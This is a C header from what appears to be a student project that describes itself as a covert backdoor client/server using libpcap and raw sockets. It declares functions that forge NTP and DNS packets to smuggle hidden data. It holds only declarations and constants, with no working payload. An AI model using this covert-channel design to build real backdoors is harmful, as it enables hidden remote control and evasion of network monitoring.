#ifndef NTP_H
#define NTP_H

/*
SOURCE FILE: covert.h

PROGRAM: Backdoor - A covert backdoor client/server using libpcap and raw sockets.

DATE: November 29, 2011

REVISIONS:
	1.0 - October 23
	1.1 - November 29, 2011

DESIGNERS:
	Martin Casado
	Modified by Aman Abdulla
  Modified by Santana Mach and Steve Stanisic

PROGRAMMERS:
  Modified by Santana Mach and Steve Stanisic

NOTES: This file contains functionality to forge application layer packets, specifically
	for the NTP and DNS protocols.
*/

#include "defs.h"

#define PORT_NTP  123
#define PORT_DNS  53
#define NTP_SIZ   48
#define DNS_SIZ   32

uint8 isReq(char* data);
void make_vanilla_ntp(char* buff);
void make_covert_ntp(char* buff, uint16 data);
void make_covert_dns(char* buff, uint16 data);
uint64 getsec();

#endif
